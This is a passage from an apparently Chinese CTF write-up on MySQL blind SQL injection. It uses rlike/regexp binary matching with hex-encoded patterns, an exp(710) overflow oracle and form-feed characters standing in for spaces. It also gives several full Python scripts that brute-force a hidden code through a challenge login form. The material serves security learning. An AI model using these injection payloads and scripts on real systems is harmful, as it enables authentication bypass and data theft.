<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">'username'</span>: <span class="token string">'admin\',
'</span>password<span class="token string">': '</span><span class="token operator">||</span>exp<span class="token punctuation">(</span><span class="token number">710</span><span class="token operator">-</span><span class="token punctuation">(</span>code <span class="token operator">rlike</span> <span class="token keyword">binary</span> {<span class="token number">0</span>}<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#',</span>
<span class="token string">'code'</span>: <span class="token string">'1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>对于上述payload的解释（GPT）：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">regexp</span> <span class="token keyword">binary</span> <span class="token string">'^sec'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>例子如上，解释如下，大概binary关键字就是用来区分大小写的吧</p>
<pre class="line-numbers language-none"><code class="language-none">这段 SQL 语句可以分为两部分，让我一步一步解释：

1. `(select database())`：这部分执行一个子查询，获取当前数据库的名称。

2. `regexp binary '^sec'`：这部分使用正则表达式进行匹配，并且使用 `binary` 进行二进制比较。

    - `regexp` 是 MySQL 中用于执行正则表达式匹配的操作符。
    
    - `binary` 是一个修饰符，用于表示要进行二进制比较。在这个上下文中，它确保正则表达式的匹配是对字节进行精确匹配，而不考虑字符的大小写或编码。

    - `'^sec'` 是一个正则表达式模式，表示以 "sec" 开头的字符串。

综合起来，整个 SQL 语句的含义是：检查当前数据库的名称是否以 "sec" 开头。如果匹配成功，查询将返回 1，表示真（true）；否则，返回 0，表示假（false）。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但这里题目过滤了引号，所以我们rlike无法直接引入%和^。按照之前的regexp注入操作我们可以将^连同后面的待猜测字符一块做Hex编码，之后进入数据库中MySQL会自动将16进制编码的字符转为对应的字符串</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">str2hex</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 转换16进制,16进制在数据库执行查询时又默认转换成字符串</span>
    result <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> string<span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'0x'</span> <span class="token operator">+</span> result

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

passwd <span class="token operator">=</span> str2hex<span class="token punctuation">(</span><span class="token string">'^'</span> <span class="token operator">+</span> name <span class="token operator">+</span> j<span class="token punctuation">)</span>
payloads <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0c</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
postdata <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'admin\\'</span><span class="token punctuation">,</span>
    <span class="token string">'password'</span><span class="token punctuation">:</span> payloads<span class="token punctuation">,</span>
    <span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>题目还限制了 password 位置匹配的字符串长度，最长只能匹配 4 个字符，如果超过了 4 个则会返回 Huge num detected 错误（但我不知道为何师傅们都说最多只能4个字符，我看着正则当中是数字9，不应该是9个字符吗。。不理解）。</p>
<p>接着我幸运地找到了一个解释：</p>
<pre class="line-numbers language-none"><code class="language-none">同时num_waf 有个判断十六进制位数不能超过9位，既字符串不能超过4位(一个字母对应2个十六进制数)，所以在包含正则^以外的字符串超过3位时需要不断做替换，用3位字符串去匹配下一位<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>那这样的话我们便不能在 payload 里面使用 <code>^</code> 了，也就没有办法在正则表达式中确定首位的位置，我们只能知道有这么几个连续的字符，就像下面这样：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token string">'flag{abcdefghijklmnopqrstuvwxyz}'</span> <span class="token operator">rlike</span> <span class="token string">'ab'</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-----------------------------------------------+</span>
<span class="token operator">|</span> <span class="token string">'flag{abcdefghijklmnopqrstuvwxyz}'</span> <span class="token operator">rlike</span> <span class="token string">'ab'</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-----------------------------------------------+</span>
<span class="token operator">|</span>                                             <span class="token number">1</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-----------------------------------------------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.04</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> <span class="token string">'flag{abcdefghijklmnopqrstuvwxyz}'</span> <span class="token operator">rlike</span> <span class="token string">'lag{'</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------------------------------------------------+</span>
<span class="token operator">|</span> <span class="token string">'flag{abcdefghijklmnopqrstuvwxyz}'</span> <span class="token operator">rlike</span> <span class="token string">'lag{'</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------------------------------------------------+</span>
<span class="token operator">|</span>                                               <span class="token number">1</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------------------------------------------------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.03</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>师傅的爆破思路：先爆破出前三位来，然后再通过前 3 位爆第4位，再通过第2、3、4位爆第5位…</p>
<p>编写如下脚本进行爆破：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string

<span class="token keyword">def</span> <span class="token function">str2hex</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 转换16进制,16进制在数据库执行查询时又默认转换成字符串</span>
    result <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> string<span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'0x'</span> <span class="token operator">+</span> result

strs <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'_'</span>
url <span class="token operator">=</span> <span class="token string">"http://690399e6-ab28-459d-ab40-789da08843fb.node4.buuoj.cn:81/login.php"</span>
headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'</span>
<span class="token punctuation">}</span>
payload <span class="token operator">=</span> <span class="token string">'||exp(710-(code rlike binary {0}))#'</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    name <span class="token operator">=</span> <span class="token string">''</span>
    z <span class="token operator">=</span> <span class="token number">3</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> strs<span class="token punctuation">:</span>
            passwd <span class="token operator">=</span> str2hex<span class="token punctuation">(</span>name <span class="token operator">+</span> j<span class="token punctuation">)</span>
            payloads <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0x0c代替空格</span>
            postdata <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'admin\\'</span><span class="token punctuation">,</span>
                <span class="token string">'password'</span><span class="token punctuation">:</span> payloads<span class="token punctuation">,</span>
                <span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
            <span class="token punctuation">}</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>postdata<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            <span class="token comment">#print(r.text)</span>
            <span class="token keyword">if</span> <span class="token string">"fail"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                name <span class="token operator">+=</span> j
                <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>

        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> j <span class="token keyword">in</span> strs<span class="token punctuation">:</span>
                    passwd <span class="token operator">=</span> str2hex<span class="token punctuation">(</span>name<span class="token punctuation">[</span>z <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">:</span>z<span class="token punctuation">]</span> <span class="token operator">+</span> j<span class="token punctuation">)</span>  <span class="token comment"># ergh</span>
                    payloads <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0c</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    postdata <span class="token operator">=</span> <span class="token punctuation">{</span>
                        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'admin\\'</span><span class="token punctuation">,</span>
                        <span class="token string">'password'</span><span class="token punctuation">:</span> payloads<span class="token punctuation">,</span>
                        <span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
                    <span class="token punctuation">}</span>
                    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>postdata<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
                    <span class="token comment"># print(r.text)</span>
                    <span class="token keyword">if</span> <span class="token string">"fail"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                        name <span class="token operator">+=</span> j
                        <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
                        z <span class="token operator">+=</span> <span class="token number">1</span>
                        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>出结果了，别高兴的太早，因为这里陷入了一个死循环当中：</p>
<pre class="line-numbers language-none"><code class="language-none">erghruigh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh2uygh......<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可以看到爆出 <code>erghruigh2</code> 之后不停地循环出现 <code>uygh2</code>，所以我们可以推测出真正的 code 里面有两个 <code>gh2</code>，其中位于前面的那个 <code>gh2</code> 后面紧跟着一个 <code>u</code>，即 <code>gh2u</code>。后面那个 <code>gh2</code> 后面跟的是那个字符我们还不能确定，那我们便可以测试一下除了 <code>u</code> 以外的其他字符，经测试第二个 <code>gh2</code> 后面跟的字符是 <code>3</code>，即 <code>gh23</code>，然后继续根据 <code>h23</code> 爆破接下来的字符就行了，最后得到的 code 如下：</p>
<pre class="line-numbers language-none"><code class="language-none">erghruigh2uygh23uiu32ig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>不过这里我也是想不通最后这个死循环的解决原理。。。</p>
<p>然后直接登陆即可得到 flag：</p>
<p><img src="image-20231215200129931.png" alt="image-20231215200129931"></p>
<p>接着我又找了几篇wp发现有位师傅直接从最后一个字符开始匹配，用到了$正则：</p>
<pre class="line-numbers language-none"><code class="language-none">$ 是一个用于锚定模式结尾位置的元字符，用于确保匹配发生在输入字符串的末尾。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这样就不会有上述重复的问题，但是也要配合从第一位开始爆破的脚本，这样两者对比才可正确得出</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string

<span class="token keyword">def</span> <span class="token function">str2hex</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 转换16进制,16进制在数据库执行查询时又默认转换成字符串</span>
    result <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> string<span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'0x'</span> <span class="token operator">+</span> result

strs <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'_'</span>
url <span class="token operator">=</span> <span class="token string">"http://690399e6-ab28-459d-ab40-789da08843fb.node4.buuoj.cn:81/login.php"</span>
headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'</span>
<span class="token punctuation">}</span>
payload <span class="token operator">=</span> <span class="token string">'||exp(710-(code rlike binary {0}))#'</span>
tmp <span class="token operator">=</span> <span class="token string">'$'</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    name <span class="token operator">=</span> <span class="token string">''</span>
    z <span class="token operator">=</span> <span class="token number">3</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> strs<span class="token punctuation">:</span>
            passwd <span class="token operator">=</span> str2hex<span class="token punctuation">(</span>j <span class="token operator">+</span> tmp<span class="token punctuation">)</span>
            payloads <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0c</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            postdata <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'admin\\'</span><span class="token punctuation">,</span>
                <span class="token string">'password'</span><span class="token punctuation">:</span> payloads<span class="token punctuation">,</span>
                <span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
            <span class="token punctuation">}</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>postdata<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            <span class="token comment">#print(r.text)</span>
            <span class="token keyword">if</span> <span class="token string">"fail"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                name <span class="token operator">+=</span> j
                <span class="token keyword">print</span><span class="token punctuation">(</span>j <span class="token operator">+</span> tmp<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
                    tmp <span class="token operator">=</span> j <span class="token operator">+</span> tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    tmp <span class="token operator">=</span> j <span class="token operator">+</span> tmp
                <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20231215200406827.png" alt="image-20231215200406827"></p>
<p>如上图，最后简单反转一下字符串即可</p>
<p>最后会有如下：</p>
<pre class="line-numbers language-none"><code class="language-none">erghruigh2uygh2uygh2uygh2uygh2
erghruigh23uiu32ig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>我们两者对比得到<code>erghruigh2uygh23uiu32ig</code></p>
<p>只能说脚本对我来说好难。。。接下来就是跟着编写脚本的时候了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string

<span class="token keyword">def</span> <span class="token function">str2hex</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'0x'</span> <span class="token operator">+</span> result

strs <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'_'</span>
url <span class="token operator">=</span> <span class="token string">'http://690399e6-ab28-459d-ab40-789da08843fb.node4.buuoj.cn:81/login.php'</span>
headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'</span>
<span class="token punctuation">}</span>

payload <span class="token operator">=</span> <span class="token string">'||exp(710-(code rlike binary {0}))#'</span>
tmp <span class="token operator">=</span> <span class="token string">'^'</span>
name <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> strs<span class="token punctuation">:</span>
        passwd <span class="token operator">=</span> str2hex<span class="token punctuation">(</span>tmp <span class="token operator">+</span> j<span class="token punctuation">)</span>
        payloads <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0c</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'\\'</span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> payloads<span class="token punctuation">,</span>
            <span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
        <span class="token punctuation">}</span>
        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'fail'</span> <span class="token keyword">in</span> req<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            name <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>tmp <span class="token operator">+</span> j<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
                tmp <span class="token operator">=</span> tmp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> j
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                tmp <span class="token operator">+=</span> j
            <span class="token keyword">break</span>

tmp <span class="token operator">=</span> <span class="token string">'$'</span>
name <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> strs<span class="token punctuation">:</span>
        passwd <span class="token operator">=</span> str2hex<span class="token punctuation">(</span>j <span class="token operator">+</span> tmp<span class="token punctuation">)</span>
        payloads <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0c</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'\\'</span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> payloads<span class="token punctuation">,</span>
            <span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
        <span class="token punctuation">}</span>
        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'fail'</span> <span class="token keyword">in</span> req<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            name <span class="token operator">=</span> j <span class="token operator">+</span> name
            <span class="token keyword">print</span><span class="token punctuation">(</span>j <span class="token operator">+</span> tmp<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
                tmp <span class="token operator">=</span> j <span class="token operator">+</span> tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                tmp <span class="token operator">=</span> j <span class="token operator">+</span> tmp
            <span class="token keyword">break</span>

data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'\\'</span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'||1#'</span><span class="token punctuation">,</span>
            <span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token string">'erghruigh2uygh23uiu32ig'</span>
        <span class="token punctuation">}</span>

req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>完整代码如上，不过我自己在编写完成后，发现从后面开始匹配的方法，有一定几率一次成功。</p>
<h1>0x04 REGEXP与LIKE注入</h1>
<p>这里质量低下，知识点基本都是照搬的，有的只是自己的思考和实操罢了</p>
<h2 id="REGEXP注入分析">REGEXP注入分析</h2>
<p><strong>注入原理</strong></p>
<p>REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。</p>
<h3 id="1、基本注入">1、基本注入</h3>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span>语句<span class="token punctuation">)</span> <span class="token operator">regexp</span> <span class="token string">'正则'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>正常的查询语句：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>（1）正则注入，若匹配则返回1，不匹配返回0</p>
